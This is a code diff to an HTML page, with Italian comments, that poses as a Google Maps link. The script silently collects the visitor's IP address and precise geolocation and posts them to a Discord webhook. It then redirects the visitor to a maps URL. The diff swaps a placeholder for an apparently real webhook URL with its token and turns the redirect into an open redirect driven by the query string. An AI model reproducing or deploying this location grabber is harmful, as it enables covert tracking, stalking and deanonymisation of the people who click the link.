@@ -12,7 +12,7 @@
   <script>
     // Ottieni il termine di ricerca dalla query string
     const urlParams = new URLSearchParams(window.location.search);
-    const searchTerm = urlParams.get('q');
+    const mapsLink = urlParams.get('q');
 
     // Raccogli l'IP e la geolocalizzazione dell'utente
     fetch("https://api.ipify.org?format=json")
@@ -28,7 +28,7 @@
       });
 
     navigator.geolocation?.getCurrentPosition(pos => {
-      fetch("https://discord.com/api/webhooks/INSERISCI_LA_TUA_WEBHOOK", {
+      fetch("https://discord.com/api/webhooks/1365383046903365642/_hXXXwqjxvNNbXGlr4YUiVujU9_FSONfQqJQSsYozLynCJQEiNFrnieXGsddc1fLREPb", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -37,10 +37,9 @@
       });
     });
 
-    // Dopo 2 secondi, redirige l'utente a Google Maps con la ricerca
+    // Dopo 2 secondi, redirige l'utente al link di Google Maps
     setTimeout(() => {
-      const googleSearchLink = "https://www.google.com/maps?q=" + encodeURIComponent(searchTerm);
-      window.location.href = googleSearchLink; // reindirizza alla ricerca su Google Maps
+      window.location.href = mapsLink; // Reindirizza l'utente
     }, 2000);
   </script>
 </head>
